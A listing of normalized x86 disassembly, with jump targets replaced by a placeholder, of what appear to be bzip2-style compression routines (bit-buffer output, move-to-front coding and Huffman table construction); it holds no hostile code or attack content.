mov [ ebp - 0x30 ] edi
call sub_10006c0f
mov edi eax
cmp edi 0x3
jne r-xdata
cmp edi 0x4
je r-xdata
push 0xfffffff8
pop esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub [ esi ] eax
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
call sub_10006d30
mov eax edi
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_10006d30
mov eax esi
jmp r-xdata
sub_10007b50
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xfffffffe
pop eax
mov esi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
cmp [ ebp + 0x18 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] 0x4
ja r-xdata
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x30 ]
push [ ebp + 0x1c ]
mov [ ebp - 0xc ] ebx
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10006d95
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x18
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x30 ] edi
call sub_10007948
mov edi eax
cmp edi ebx
jne r-xdata
cmp edi 0x4
je r-xdata
cmp [ ebp - 0x1c ] ebx
jbe r-xdata
mov eax [ ebp - 0x1c ]
sub [ esi ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10007a18
mov eax edi
jmp r-xdata
push 0xfffffff8
jmp r-xdata
push 0xfffffff9
pop ebx
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_10007a18
mov eax ebx
jmp r-xdata
sub_10007c19
cmp [ eax + 0x25c ] 0x0
jle r-xdata
retn
push ebx
lea ecx [ eax + 0x258 ]
push esi
mov esi [ eax + 0x4c ]
mov bl [ ecx + 0x3 ]
mov edx [ eax + 0x2c ]
mov [ edx + esi ] bl
inc [ eax + 0x4c ]
shl [ ecx ] 0x8
add [ eax + 0x25c ] 0xfffffff8
cmp [ eax + 0x25c ] 0x0
jg r-xdata
pop esi
pop ebx
sub_10007c4f
cmp [ eax + 0x25c ] 0x8
push esi
push edi
mov esi ecx
jl r-xdata
mov edx [ eax + 0x25c ]
mov edi [ esp + 0xc ]
push 0x20
pop ecx
sub ecx edx
sub ecx edi
shl esi cl
add edx edi
pop edi
mov [ eax + 0x25c ] edx
or [ eax + 0x258 ] esi
pop esi
retn
lea ecx [ eax + 0x258 ]
push ebx
mov edi [ eax + 0x4c ]
mov bl [ ecx + 0x3 ]
mov edx [ eax + 0x2c ]
mov [ edx + edi ] bl
inc [ eax + 0x4c ]
shl [ ecx ] 0x8
add [ eax + 0x25c ] 0xfffffff8
cmp [ eax + 0x25c ] 0x8
jge r-xdata
pop ebx
sub_10007caa
push esi
mov ecx ebx
shr ecx 0x18
push 0x8
call sub_10007c4f
mov ecx ebx
shr ecx 0x10
mov esi 0xff
and ecx esi
push 0x8
call sub_10007c4f
mov ecx ebx
shr ecx 0x8
and ecx esi
push 0x8
call sub_10007c4f
movzx ecx bl
push 0x8
call sub_10007c4f
add esp 0x10
pop esi
retn
sub_10007d17
push ebp
lea ebp [ esp - 0x9c ]
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x80 ] eax
mov eax [ esi + 0x24 ]
push ebx
mov ebx [ esi + 0x28 ]
mov [ ebp - 0x7c ] eax
push edi
mov eax esi
call sub_10007cf3
mov edx [ esi + 0x54 ]
inc edx
mov [ ebp - 0x78 ] edx
js r-xdata
xor eax eax
xor edi edi
cmp [ esi + 0x54 ] eax
mov [ ebp - 0x70 ] eax
jle r-xdata
lea edi [ esi + 0x278 ]
lea ecx [ edx + 0x1 ]
xor eax eax
[ edi ]
and [ ebp - 0x74 ] 0x0
cmp [ esi + 0x44 ] 0x0
jle r-xdata
mov ecx [ esi + 0x54 ]
mov ecx [ ebp + 0x98 ]
mov [ ebx + edi * 2 ] dx
lea eax [ esi + edx * 4 + 0x278 ]
inc [ eax ]
inc edi
mov [ esi + 0x274 ] edi
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x9c
leave
retn
mov eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x74 ]
mov eax [ eax + ecx * 4 ]
dec eax
jns r-xdata
mov [ ebp + eax - 0x68 ] al
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ ebp - 0x7c ]
movzx eax [ eax + ecx ]
mov al [ eax + esi + 0x158 ]
mov [ ebp - 0x69 ] al
cmp [ ebp - 0x68 ] al
jne r-xdata
add eax [ esi + 0x44 ]
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov al [ ebp - 0x68 ]
mov cl [ ebp - 0x67 ]
mov [ ebp - 0x67 ] al
lea eax [ ebp - 0x67 ]
jmp r-xdata
dec eax
inc [ ebp - 0x74 ]
mov eax [ ebp - 0x74 ]
cmp eax [ esi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x69 ] cl
jne r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc eax
mov dl cl
mov cl [ eax ]
mov [ eax ] dl
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x68 ] cl
lea ecx [ ebp - 0x68 ]
sub eax ecx
lea ecx [ eax + 0x1 ]
mov [ ebx + edi * 2 ] cx
lea eax [ esi + eax * 4 + 0x27c ]
inc edi
inc [ eax ]
and [ ebp - 0x70 ] 0x0
add eax 0xfffffffe
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
dec eax
xor ecx ecx
test al 0x1
je r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
add eax 0xfffffffe
cdq
sub eax edx
mov edx [ ebp - 0x78 ]
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
xor ecx ecx
test al 0x1
je r-xdata
sub_10007e93
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ esi + 0x28 ]
push edi
mov edi [ esi + 0x54 ]
inc edi
inc edi
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] 0x6
add [ ebp - 0x20 ] 0x102
dec [ ebp - 0x2c ]
jne r-xdata
push edi
push 0xf
push [ ebp - 0x20 ]
call sub_10010a00
add esp 0xc
test edi edi
jle r-xdata
mov eax [ esi + 0x274 ]
cmp eax 0xc8
jge r-xdata
cmp eax 0x258
jge r-xdata
mov [ ebp - 0x28 ] 0x2
jmp r-xdata
cmp eax 0x4b0
jge r-xdata
mov [ ebp - 0x28 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x28 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x18 ] eax
test ecx ecx
jle r-xdata
xor ecx ecx
cmp eax 0x960
setge cl
add ecx 0x5
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x28 ] 0x4
jmp r-xdata
mov [ ebp - 0x38 ] 0x4
and [ ebp - 0x20 ] 0x0
mov edi ecx
add edi 0x91
imul edi edi 0x102
add edi esi
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
mov ecx [ ebp - 0x28 ]
xor eax eax
lea edi [ ebp - 0x54 ]
[ edi ]
mov eax [ ebp - 0x28 ]
lea edx [ esi + 0xb160 ]
mov [ ebp - 0x20 ] eax
cmp ecx [ ebp - 0x1c ]
jle r-xdata
lea eax [ esi + ecx * 4 + 0x278 ]
jmp r-xdata
mov ecx [ esi + 0x274 ]
xor eax eax
cmp ecx eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x1c ] eax
jle r-xdata
cmp [ ebp - 0x34 ] 0x0
jle r-xdata
add edx 0x408
dec [ ebp - 0x20 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
xor eax eax
mov edi edx
[ edi ]
xor eax eax
cmp [ ebp - 0x34 ] eax
jle r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x28 ]
je r-xdata
mov edx [ ebp - 0x34 ]
dec edx
cmp ecx edx
jge r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
lea edx [ eax + 0x31 ]
cmp edx ecx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x24 ] edx
jl r-xdata
mov edx [ ebp - 0x34 ]
lea eax [ esi + 0x9324 ]
lea ecx [ esi + 0xc994 ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x34 ] 0x0
jle r-xdata
dec [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
sub [ ebp - 0x18 ] eax
sub edi 0x102
inc [ ebp - 0x20 ]
inc ecx
cmp [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1c ] ecx
jg r-xdata
cmp eax [ ebp - 0x1c ]
jl r-xdata
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0x2c ]
add eax 0x4
add edx [ eax ]
inc ecx
cmp edx [ ebp - 0x8 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x2c ] edx
jl r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x28 ]
lea edi [ esi + 0xb160 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x28 ]
test ecx ecx
jle r-xdata
dec ecx
mov [ ebp - 0x24 ] ecx
movzx edx [ eax + 0x102 ]
movzx edi [ eax ]
shl edx 0x10
or edx edi
mov [ ecx - 0x4 ] edx
movzx edx [ eax + 0x306 ]
movzx edi [ eax + 0x204 ]
shl edx 0x10
or edx edi
mov [ ecx ] edx
movzx edx [ eax + 0x50a ]
movzx edi [ eax + 0x408 ]
shl edx 0x10
or edx edi
mov [ ecx + 0x4 ] edx
inc eax
add ecx 0x10
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
cdq
idiv [ ebp - 0x24 ]
mov ecx [ ebp - 0x1c ]
and [ ebp - 0x2c ] 0x0
dec ecx
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
mov [ edi + eax ] 0xf
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x80000001
jns r-xdata
mov eax [ ebp - 0x38 ]
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
xor eax eax
cmp [ ebp - 0x28 ] eax
jle r-xdata
push 0x11
push [ ebp - 0x34 ]
push edi
push [ ebp - 0x20 ]
call sub_1000b4fb
add [ ebp - 0x20 ] 0x102
add esp 0x10
add edi 0x408
dec [ ebp - 0x24 ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
lea edi [ ebp - 0x10 ]
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ ebp - 0x1c ]
mov [ edi + eax ] 0x0
jmp r-xdata
cmp eax 0x1
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov eax [ ebp - 0x2c ]
test eax eax
jle r-xdata
mov [ ebp + eax - 0xc ] al
inc eax
cmp eax [ ebp - 0x28 ]
jl r-xdata
cmp eax [ ebp - 0x24 ]
mov ecx eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx eax
inc ecx
cmp ecx 0x32
jne r-xdata
inc eax
cmp eax [ ebp - 0x34 ]
jl r-xdata
mov eax [ esi + ecx * 4 + 0x278 ]
sub [ ebp - 0x2c ] eax
dec ecx
mov ecx [ ebp - 0x28 ]
test ecx ecx
jle r-xdata
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] ecx
jle r-xdata
mov eax [ ebp - 0x1c ]
lea edi [ ebx + eax * 2 ]
movzx eax [ edi ]
movzx edi [ edi + 0x2 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
movzx ecx ax
lea eax [ ecx + 0xc99 ]
shl eax 0x4
mov eax [ eax + esi ]
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
shl ecx 0x4
lea edx [ ecx + esi ]
mov ecx [ edx + 0xc994 ]
add ecx [ edi + 0xc994 ]
mov edx [ edx + 0xc998 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x4 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x6 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x8 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0xa ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0xc ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0xe ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x10 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x12 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x14 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x16 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x18 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x1a ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x1c ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x1e ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x20 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x22 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x24 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x26 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x28 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x2a ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x2c ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x2e ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x30 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x32 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x34 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x36 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x38 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x3a ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x3c ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x3e ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x40 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x42 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x44 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x46 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x48 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x4a ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x4c ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x4e ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x50 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x52 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x54 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x56 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x58 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x5a ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x5c ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x5e ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x1c ]
movzx edi [ ebx + edi * 2 + 0x60 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x20 ]
movzx edi [ ebx + edi * 2 ]
mov [ ebp - 0x18 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x18 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov [ ebp - 0x10 ] ax
shr eax 0x10
mov [ ebp - 0xc ] cx
shr ecx 0x10
mov [ ebp - 0x8 ] dx
shr edx 0x10
mov [ ebp - 0xe ] ax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xa ] cx
mov [ ebp - 0x6 ] dx
jmp r-xdata
lea eax [ esi + 0x58 ]
xor ecx ecx
mov edi eax
lea eax [ esi + 0x9930 ]
mov [ ebp - 0x18 ] eax
lea eax [ esi + 0x9324 ]
mov edi eax
mov [ ebp - 0x38 ] ecx
mov al [ ebp - 0x2d ]
mov [ edi ] cl
inc edi
dec [ ebp - 0x38 ]
mov [ ebp - 0xc ] al
jne r-xdata
mov al [ ebp - 0x2d ]
inc ecx
mov [ ebp - 0x39 ] al
lea eax [ ebp + ecx - 0xc ]
mov dl [ eax ]
mov [ ebp - 0x2d ] dl
mov dl [ ebp - 0x39 ]
mov [ eax ] dl
mov al [ edi - 0x4652 ]
cmp al [ ebp - 0x2d ]
jne r-xdata
and [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x28 ] 0x0
movzx ecx [ ebx + ecx * 2 ]
jle r-xdata
and [ ebp - 0x1c ] 0x0
or ecx 0xffffffff
cmp [ ebp - 0x28 ] 0x0
